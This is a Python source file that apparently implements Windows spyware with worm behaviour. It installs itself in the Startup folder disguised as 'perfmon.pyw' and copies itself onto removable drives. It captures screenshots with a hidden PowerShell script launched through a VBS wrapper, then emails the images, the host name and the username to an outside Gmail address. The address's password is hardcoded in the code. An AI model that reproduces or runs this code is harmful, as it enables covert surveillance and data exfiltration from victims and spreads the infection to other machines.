from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import smtplib, getpass, platform, sys
def send_creds(filename, plaintext):
    try:
        msg = MIMEMultipart()
        password = "bnnysefnmxdoxokg"
        msg['From'] = "9acompanylimited@gmail.com"
        msg['To'] = "borissmazz@gmail.com"
        msg['Subject'] = platform.node()+" "+getpass.getuser()
        msg.attach(MIMEText(plaintext, 'plain'))
        msg.attach(MIMEImage(open(filename, "rb").read()))
        server = smtplib.SMTP('smtp.gmail.com: 587')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
    except:pass
def doauthorun():
    path = "C:\\Users\\"+getpass.getuser()+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\perfmon.pyw"
    import shutil
    try:
        shutil.copyfile(sys.argv[0], path)
    except shutil.SameFileError:pass
def spread_via_usb():
    import os, shutil
    if os.path.isdir("F:") == True:
        try:
            shutil.copyfile(sys.argv[0], "F:/PerfMon.pyw")
        except:pass
    if os.path.isdir("E:") == True:
        try:
            shutil.copyfile(sys.argv[0], "E:/PerfMon.pyw")
        except:pass
    if os.path.isdir("D:") == True:
        try:
            shutil.copyfile(sys.argv[0], "D:/PerfMon.pyw")
        except:pass
    if os.path.isdir("H:") == True:
        try:
            shutil.copyfile(sys.argv[0], "H:/PerfMon.pyw")
        except:pass
    if os.path.isdir("G:") == True:
        try:
            shutil.copyfile(sys.argv[0], "G:/PerfMon.pyw")
        except:pass
    if os.path.isdir("I:") == True:
        try:
            shutil.copyfile(sys.argv[0], "I:/PerfMon.pyw")
        except:pass
def perform_screencap():
    payload = '''
$Path = "C:/.SysdbContainer/logdata"
If (!(test-path $path)) {
New-Item -ItemType Directory -Force -Path $path
}
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphic = [System.Drawing.Graphics]::FromImage($image)
$point = New-Object System.Drawing.Point(0, 0)
$graphic.CopyFromScreen($point, $point, $image.Size);
$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)
[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds)
$image.Save("$path/result.png", [System.Drawing.Imaging.ImageFormat]::Png)
'''
    with open("C:/Users/"+getpass.getuser()+"/Pictures/scr.ps1", "w") as payload_screencaper:
        payload_screencaper.write(payload)
        payload_screencaper.close()
    import os
    attack = "powershell -win hidden -noni -nop -executionpolicy bypass C:/Users/"+getpass.getuser()+"/Pictures/scr.ps1"
    initializer_p = '''
command = "'''+attack+'''"
set shell = CreateObject("WScript.Shell")
shell.Run command,0, false
'''
    with open("C:/Users/"+getpass.getuser()+"/Pictures/scr.vbs", "w") as initializer:
        initializer.write(initializer_p)
        initializer.close()
    os.popen("C:/Users/"+getpass.getuser()+"/Pictures/scr.vbs")
#MAIN ----------------------------------------------------------------------------------------------------------
import time
time.sleep(30)
doauthorun()
while True:
    perform_screencap()
    spread_via_usb()
    send_creds("C:/.SysdbContainer/logdata/result.png", platform.system()+" "+platform.version())
    time.sleep(50000)
